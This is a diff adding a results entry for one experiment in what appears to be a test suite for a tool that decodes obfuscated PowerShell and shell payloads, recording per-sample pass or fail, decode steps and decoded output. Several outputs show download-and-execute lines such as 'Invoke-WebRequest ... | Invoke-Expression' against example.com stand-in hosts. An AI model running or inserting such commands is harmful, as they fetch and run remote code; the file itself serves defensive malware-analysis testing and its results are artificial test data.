@@ -573,6 +573,114 @@
     }
   },
   {
+    "experiment": "hunk_6c_convergence_penalty",
+    "note": "hunk6c applied \u00b7 convergence-score penalty for normalizer placeholders",
+    "pass_count": 1,
+    "total": 11,
+    "per_sample": {
+      "S001_ps_writehost_tweet": {
+        "pass": true,
+        "against": "owner_expected",
+        "ops": [
+          "extract-payload",
+          "base64-decode"
+        ],
+        "final_head": "Write-Host \"tweet, tweet!\""
+      },
+      "S01_ps_b64_utf16le": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "ps-encodedcommand-recovery",
+          "extract-payload",
+          "ioc-extract",
+          "family-emotet"
+        ],
+        "final_head": "http://example.com/stage1"
+      },
+      "S02_bash_xxd_b64_rev": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "powershell-alias-normalize"
+        ],
+        "final_head": "Write-Output 'MzAyZTMwMmUzMTJlMzEyMDIwMjMyMDcwNmY3NzY1NzI3MzY4NjU2YzZjIGNvbW1lbnQ=' | rev | base64 -d | xxd -r -p"
+      },
+      "S03_cmd_caret_escaped": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "cmd-runtime-reconstruct",
+          "extract-payload",
+          "base64-decode",
+          "utf16le-or-utf8-decode"
+        ],
+        "final_head": "IEX('net.webclient')"
+      },
+      "S04_ps_alias_heavy": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "ps-reconstruct",
+          "powershell-alias-normalize",
+          "ioc-extract"
+        ],
+        "final_head": "$a='http://example.com/x'; Invoke-WebRequest 'http://example.com/x' -useb | Invoke-Expression"
+      },
+      "S05_nested_b64_gzip": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "extract-payload",
+          "base64-decode",
+          "crypto-detect"
+        ],
+        "final_head": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u25bc INVESTIGATION BRAIN \u00b7 RTE DECODER TRACE\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  st"
+      },
+      "S06_xor_obfuscated": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [],
+        "final_head": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY  (payload already plaintext \u2014 no decode needed)\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+      },
+      "S07_rc4_openssl": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "rot47"
+        ],
+        "final_head": "@A6?DD= 6?4 \\C4c \\z e3edfh \\:? \\ kkk V&auD5v'<)`Z234567_`abcd^#rc(C2AA65!2J=@25llV"
+      },
+      "S08_unicode_obfuscation": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "extract-payload",
+          "ioc-extract",
+          "family-emotet"
+        ],
+        "final_head": "http://ex.com/a"
+      },
+      "S09_hex_b64_gzip_chain": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "hex-decode",
+          "base64-decode"
+        ],
+        "final_head": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u25bc INVESTIGATION BRAIN \u00b7 RTE DECODER TRACE\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  st"
+      },
+      "S10_bash_with_powershell_comment": {
+        "pass": false,
+        "against": "v1.5.6_fingerprint",
+        "ops": [
+          "powershell-alias-normalize"
+        ],
+        "final_head": "Write-Output 'hello world'  # note: this is not powershell"
+      }
+    }
+  },
+  {
     "experiment": "combined_all_hunks",
     "note": "hunk_1 + hunk_2 + hunk_3 + hunk_4 applied together",
     "pass_count": 10,
